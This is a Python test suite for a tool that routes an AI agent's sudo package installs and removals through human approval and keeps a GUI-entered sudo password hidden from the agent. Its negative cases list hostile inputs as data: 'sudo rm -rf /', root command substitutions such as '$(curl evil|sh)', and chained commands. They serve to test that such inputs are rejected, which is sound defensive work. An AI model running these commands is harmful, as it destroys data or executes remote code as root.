"""v2.4.6 — sudo package REMOVALS (same forced-approval flow as
installs), the GUI sudo password (memory-only, agent-invisible), and
the approvals-selection responsiveness fix.

User spec (session 17): "add the removal as you did for the package
installation"; "add a field to type my sudo password in, the sudo
password should always be filled in by the program itself and never
revealed to the AI/LLM"; plus the bug report "the approval menu does
not have a highlight on the selected approval, feels unresponsive".
"""
import io
import json
import os
import re
import subprocess
import sys
import threading
import time
import unittest
from unittest import mock

_THIS = os.path.dirname(os.path.abspath(__file__))
_PARENT = os.path.dirname(_THIS)
for _p in (_PARENT, _THIS):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from helpers import TestHost
from core.policy import (InstallPolicy, _SUDO_PKG_RE, _SUDO_INSTALL_RE,
                         _SUDO_REMOVE_RE)

GUI_SRC = os.path.join(_PARENT, "gui.py")
API_SRC = os.path.join(_PARENT, "core", "api.py")

_PW = "llmac-test-secret-never-leak"
_RM_CMD = "sudo pacman -R llmac-should-not-exist"


# ---------------------------------------------------------------------------
# 1. Policy: removal matrix + install regression (pure)
# ---------------------------------------------------------------------------

class TestPolicyRemovalMatrix(unittest.TestCase):

    def setUp(self):
        self.p = InstallPolicy()

    def _v(self, cmd):
        return self.p.pre_exec(cmd, "/tmp")

    def test_removal_forms_are_markers_with_verb(self):
        for cmd in ("sudo pacman -R figlet",
                    "sudo pacman -Rs figlet",
                    "sudo pacman -Rns figlet",
                    "sudo pacman --remove figlet",
                    "sudo apt remove figlet",
                    "sudo apt purge figlet",
                    "sudo apt-get remove figlet",
                    "sudo apt-get purge figlet",
                    "sudo apt-get remove -y figlet",
                    "sudo dnf remove figlet",
                    "sudo dnf erase figlet",
                    "sudo yum remove figlet",
                    "sudo yum erase figlet",
                    "sudo zypper remove figlet",
                    "sudo zypper rm figlet",
                    "sudo apk del figlet",
                    "sudo apk remove figlet"):
            v = self._v(cmd)
            self.assertIsNotNone(v, cmd)
            self.assertTrue(v.get("needs_sudo_approval"), cmd)
            self.assertEqual(v.get("rule"), "sudo_package_remove", cmd)
            self.assertEqual(v.get("sudo_verb"), "remove", cmd)

    def test_argless_pacman_forms_are_markers(self):
        # -R (like install-side -Syu) is a real standalone op: allowed
        # into the approval flow; it errors harmlessly at runtime.
        for cmd in ("sudo pacman -R", "sudo pacman -Rns"):
            v = self._v(cmd)
            self.assertTrue(v.get("needs_sudo_approval"), cmd)
            self.assertEqual(v.get("sudo_verb"), "remove", cmd)

    def test_install_forms_still_install_verb(self):
        # regression: v2.4.5 behavior unchanged
        for cmd in ("sudo pacman -S ghidra", "sudo pacman -Syu",
                    "sudo pacman -S figlet --noconfirm",
                    "sudo apt install build-essential",
                    "sudo apt-get install -y cmake",
                    "sudo dnf install radare2", "sudo yum install nmap",
                    "sudo zypper install hexyl", "sudo apk add strace"):
            v = self._v(cmd)
            self.assertEqual(v.get("rule"), "sudo_package_install", cmd)
            self.assertEqual(v.get("sudo_verb"), "install", cmd)

    def test_removal_negatives_fail_closed(self):
        for cmd in ("sudo pacman -R a && sudo pacman -S b",
                    "sudo pacman -R a; touch /tmp/x",
                    "sudo pacman -R a > /tmp/f",
                    "sudo pacman -R a | tee /tmp/f",
                    "sudo apt remove",               # argless: rejected
                    "sudo rm -rf /",
                    "sudo pacman -Q htop",
                    "sudo zypper in figlet"):        # alias not allowed
            v = self._v(cmd)
            self.assertIsNotNone(v, cmd)
            self.assertFalse(v.get("needs_sudo_approval"), cmd)
            self.assertEqual(v.get("rule"), "sudo_not_package_install", cmd)

    def test_substitution_in_args_is_rejected_both_verbs(self):
        """v2.4.6 hardening found while writing these tests: the old
        args char-class allowed $() and backticks, so an APPROVED
        `sudo pacman -S x $(curl evil|sh)` would have run command
        substitution as root. Both shapes now fail closed."""
        for cmd in ("sudo pacman -S six $(curl evil|sh)",
                    "sudo pacman -S x $(id)",
                    "sudo pacman -R a $(id)",
                    "sudo apt install x $(whoami)",
                    "sudo pacman -S a `id`",
                    "sudo pacman -Rns a `curl evil`",
                    "sudo pacman -S \\$(id)",
                    "sudo pacman -R a\\b"):
            v = self._v(cmd)
            self.assertIsNotNone(v, cmd)
            self.assertFalse(v.get("needs_sudo_approval"), cmd)
            self.assertEqual(v.get("rule"), "sudo_not_package_install", cmd)

    def test_bare_removal_without_sudo_is_noop(self):
        # Bare (non-sudo) removals are NOT install attempts, so the
        # policy has nothing to gate — at runtime they simply fail: a
        # package REMOVAL needs root, and without sudo the bridge user
        # has none. Same class as queries (`pacman -Q`).
        self.assertIsNone(self._v("pacman -R figlet"))
        self.assertIsNone(self._v("apt remove figlet"))
        self.assertIsNone(self._v("pacman -Q htop"))
        # ...while bare INSTALLS remain explicitly rejected (they would
        # modify the system python).
        v = self._v("pacman -S figlet")
        self.assertEqual(v["rule"], "system_package_manager")

    def test_combined_shape_covers_removals(self):
        # sandbox.py imports _SUDO_PKG_RE for its sudo-token exemption;
        # the combined regex must fullmatch BOTH verbs so the exemption
        # cannot drift between installs and removals.
        for cmd in ("sudo pacman -S six", "sudo pacman -Rns six",
                    "sudo apt remove six", "sudo zypper rm six",
                    "sudo apk del six"):
            self.assertTrue(_SUDO_PKG_RE.fullmatch(" ".join(cmd.split())),
                            cmd)
        for cmd in ("sudo rm -rf /", "sudo pacman -Q six",
                    "sudo pacman -S a $(id)"):
            self.assertFalse(_SUDO_PKG_RE.fullmatch(" ".join(cmd.split())),
                             cmd)


# ---------------------------------------------------------------------------
# 2. _run_exec password plumbing (Popen recorder)
# ---------------------------------------------------------------------------

class _FakeStdin(io.BytesIO):
    """Records written bytes so they stay assertable after close()."""
    closed = False
    data = b""

    def write(self, b):
        self.data += bytes(b)
        return super().write(b)

    def close(self):
        self.closed = True
        super().close()


class _FakeProc:
    def __init__(self, argv, kwargs):
        self.argv = argv
        self.kwargs = kwargs
        self.stdin = (_FakeStdin()
                      if kwargs.get("stdin") is subprocess.PIPE else None)
        self.stdout = io.BytesIO(b"fake-ok")
        self.stderr = io.BytesIO(b"")
        self.pid = 424242

    def wait(self, timeout=None):
        return 0

    def kill(self):
        pass


class TestRunExecPasswordPlumbing(unittest.TestCase):

    def _host(self):
        return TestHost(settings={"sudo_timeout_s": 5})

    def test_password_transform_and_stdin(self):
        host = self._host()
        try:
            captured = {}

            def fake_popen(argv, **kwargs):
                proc = _FakeProc(argv, kwargs)
                captured["proc"] = proc
                return proc

            with mock.patch("core.api.subprocess.Popen",
                            side_effect=fake_popen):
                from core.api import _run_exec
                agent = {"name": "default"}
                out = _run_exec(host.ctx, agent, "sudo pacman -S six",
                                host.root, 30, sudo_password=_PW)
            proc = captured["proc"]
            # transformed: -S -p '' injected right after sudo
            self.assertEqual(proc.argv[2], "sudo -S -p '' pacman -S six")
            # the password traveled via stdin, exactly once, with newline
            self.assertEqual(proc.stdin.data, (_PW + "\n").encode())
            self.assertTrue(proc.stdin.closed)
            # the RESPONSE carries the original command and no secret
            self.assertEqual(out["command"], "sudo pacman -S six")
            self.assertNotIn(_PW, json.dumps(out))
            self.assertEqual(out["returncode"], 0)
        finally:
            host.stop()

    def test_no_password_means_no_transform(self):
        host = self._host()
        try:
            captured = {}

            def fake_popen(argv, **kwargs):
                proc = _FakeProc(argv, kwargs)
                captured["proc"] = proc
                captured["kwargs"] = kwargs
                return proc

            with mock.patch("core.api.subprocess.Popen",
                            side_effect=fake_popen):
                from core.api import _run_exec
                agent = {"name": "default"}
                _run_exec(host.ctx, agent, "sudo pacman -S six",
                          host.root, 30, sudo_password=None)
            self.assertEqual(captured["proc"].argv[2], "sudo pacman -S six")
            self.assertNotIn(_PW, json.dumps(captured["kwargs"],
                                             default=str))
        finally:
            host.stop()

    def test_audit_and_logs_keep_original_command_only(self):
        host = self._host()
        try:
            logs = []
            host.ctx.log_callback = lambda rec: logs.append(rec)

            def fake_popen(argv, **kwargs):
                return _FakeProc(argv, kwargs)

            with mock.patch("core.api.subprocess.Popen",
                            side_effect=fake_popen):
                from core.api import _run_exec
                agent = {"name": "default"}
                _run_exec(host.ctx, agent, "sudo pacman -R six",
                          host.root, 30, sudo_password=_PW)
            for rec in logs:
                self.assertNotIn(_PW, json.dumps(rec, default=str))
            # the on-disk audit JSONL must carry the original command
            # and no trace of the password
            hist_path = os.path.join(host.data_dir, "history.jsonl")
            with open(hist_path, encoding="utf-8") as f:
                hist = f.read()
            self.assertNotIn(_PW, hist)
            self.assertIn('"sudo pacman -R six"', hist)
            self.assertNotIn("sudo -S -p ''", hist)
        finally:
            host.stop()


# ---------------------------------------------------------------------------
# 3. E2E through the API: removal approvals + password invisibility
# ---------------------------------------------------------------------------

class TestRemovalE2E(unittest.TestCase):

    def _host(self, **settings):
        base = {"sudo_timeout_s": 5}
        base.update(settings)
        return TestHost(settings=base)

    def test_removal_prompts_under_auto_all_and_timeout_approve_runs(self):
        host = self._host(approval_policy="auto_all",
                          sudo_timeout_action="approve")
        try:
            host.ctx.sudo_password = _PW
            with mock.patch("core.api.subprocess.Popen",
                            side_effect=lambda a, **k: _FakeProc(a, k)):
                resp, status = host.req(
                    "POST", "/exec", {"command": _RM_CMD, "timeout": 20})
            self.assertEqual(status, 200)
            self.assertIsInstance(resp["returncode"], int)
            d = host.ctx.approvals.recent_decided(5)[0]
            self.assertEqual(d["op"], "sudo_remove")
            self.assertEqual(d["status"], "approved")
            self.assertEqual(d["decided_by"], "timeout")
        finally:
            host.stop()

    def test_removal_denied_is_403_and_never_runs(self):
        host = self._host(approval_policy="auto_all",
                          sudo_timeout_action="reject")

        def deny_when_pending():
            for _ in range(80):
                pend = host.ctx.approvals.pending()
                if pend:
                    host.ctx.approvals.decide(pend[0]["id"], False,
                                              by="host")
                    return
                time.sleep(0.1)

        try:
            th = threading.Thread(target=deny_when_pending)
            th.start()
            resp, status = host.req("POST", "/exec",
                                    {"command": _RM_CMD, "timeout": 30})
            th.join()
            self.assertEqual(status, 403)
            self.assertEqual(resp["error"], "approval_denied")
        finally:
            host.stop()

    def test_password_used_but_invisible_everywhere(self):
        """THE user guarantee: approved removal RUNS with the password,
        but no response, event, audit, or /info ever carries it."""
        host = self._host(approval_policy="auto",
                          sudo_timeout_action="approve")
        try:
            host.ctx.sudo_password = _PW
            captured = {}

            def fake_popen(argv, **kwargs):
                proc = _FakeProc(argv, kwargs)
                captured["proc"] = proc
                return proc

            with mock.patch("core.api.subprocess.Popen",
                            side_effect=fake_popen):
                resp, status = host.req(
                    "POST", "/exec", {"command": _RM_CMD, "timeout": 20})
            self.assertEqual(status, 200)
            # the password WAS used for the run
            self.assertEqual(captured["proc"].argv[2],
                             "sudo -S -p '' pacman -R "
                             "llmac-should-not-exist")
            self.assertEqual(captured["proc"].stdin.data,
                             (_PW + "\n").encode())
            # and it never crossed back
            self.assertNotIn(_PW, json.dumps(resp))
            info, _ = host.req("GET", "/info")
            self.assertNotIn(_PW, json.dumps(info))
            hist_path = os.path.join(host.data_dir, "history.jsonl")
            with open(hist_path, encoding="utf-8") as f:
                self.assertNotIn(_PW, f.read())
            d = host.ctx.approvals.recent_decided(5)[0]
            self.assertNotIn(_PW, json.dumps(d))
            self.assertEqual(d["op"], "sudo_remove")
        finally:
            host.stop()

    def test_no_api_reads_or_writes_the_password(self):
        """There must be NO request-parsing path to sudo_password: no
        guessing oracle, no read-back, no assignment anywhere in the
        api module (the ONLY writer is the GUI, same process)."""
        src = open(API_SRC, encoding="utf-8").read()
        self.assertNotIn('p.get("sudo_password"', src)
        self.assertNotIn("p.get('sudo_password'", src)
        self.assertNotIn('payload.get("sudo_password"', src)
        self.assertNotIn('"sudo_password":', src)
        # api.py never ASSIGNS it (reads only: ctx.sudo_password).
        writes = re.findall(r'(?:ctx|self)\.sudo_password\s*=(?!=)', src)
        self.assertEqual(writes, [])

    def test_batch_removal_per_op_result(self):
        host = self._host(approval_policy="auto_all",
                          sudo_timeout_action="reject")

        def deny_when_pending():
            for _ in range(80):
                pend = host.ctx.approvals.pending()
                if pend:
                    host.ctx.approvals.decide(pend[0]["id"], False,
                                              by="host")
                    return
                time.sleep(0.1)

        try:
            th = threading.Thread(target=deny_when_pending)
            th.start()
            resp, status = host.req("POST", "/batch", {"ops": [
                {"op": "write", "path": os.path.join(host.root,
                                                     "batch246.txt"),
                 "content": "kept"},
                {"op": "exec", "command": _RM_CMD, "timeout": 20}]})
            th.join()
            self.assertEqual(status, 200)
            w = resp["results"][0]
            e = resp["results"][1]
            # the write landed fully (batch wraps the handler result in
            # {"index", "op", "ok": <handler-dict>}); the removal was
            # denied per-op and the batch itself still returned 200.
            self.assertEqual(w.get("ok", {}).get("bytes"), len("kept"))
            self.assertEqual(e.get("error"), "approval_denied")
        finally:
            host.stop()


# ---------------------------------------------------------------------------
# 4. GUI wiring (source-level — PyQt is unavailable headless)
# ---------------------------------------------------------------------------

class TestGuiWiring(unittest.TestCase):

    def setUp(self):
        self.src = open(GUI_SRC, encoding="utf-8").read()

    def test_selection_qss_is_strong(self):
        self.assertIn("QListWidget::item:selected", self.src)
        self.assertIn("border-left: 3px solid #8b9aff", self.src)
        self.assertIn("rgba(124,140,248,0.55)", self.src)
        self.assertNotIn("rgba(124,140,248,0.30)", self.src)

    def test_buttons_track_selection(self):
        self.assertIn("self.approve_btn.setEnabled(False)", self.src)
        self.assertIn("self.deny_btn.setEnabled(False)", self.src)
        self.assertIn("currentItemChanged.connect", self.src)
        self.assertIn("itemDoubleClicked.connect", self.src)
        self.assertIn("def _update_approval_buttons", self.src)

    def test_password_field_wiring(self):
        self.assertIn("setEchoMode(QLineEdit.EchoMode.Password)", self.src)
        self.assertIn("def _save_sudo_password", self.src)
        self.assertIn("def _clear_sudo_password", self.src)
        self.assertIn("self._sudo_pw_staged = None", self.src)
        # staged password rides into a fresh context on first start
        self.assertRegex(
            self.src, r"if self\._sudo_pw_staged:\s*\n"
                      r"\s*self\.ctx\.sudo_password = self\._sudo_pw_staged")

    def test_password_never_in_persisted_settings(self):
        # build_state() persists dict(settings) — the password must
        # never be assigned into self.settings anywhere in the GUI.
        self.assertNotIn('self.settings["sudo_password"', self.src)
        self.assertNotIn("self.settings['sudo_password'", self.src)
        state_src = open(os.path.join(_PARENT, "core", "state.py"),
                         encoding="utf-8").read()
        self.assertNotIn("sudo_password", state_src)

    def test_approval_item_text_verb_labels(self):
        self.assertIn('a["op"] in ("sudo_install", "sudo_remove")', self.src)
        self.assertIn('"sudo install" if a["op"] == "sudo_install"', self.src)
        self.assertIn("sudo remove", self.src)

    def test_agent_md_documents_both_verbs(self):
        md = open(os.path.join(_PARENT, "agent.md"), encoding="utf-8").read()
        self.assertIn("sudo pacman -S|-R", md)
        self.assertIn("install|remove", md)


if __name__ == "__main__":
    unittest.main(verbosity=2)
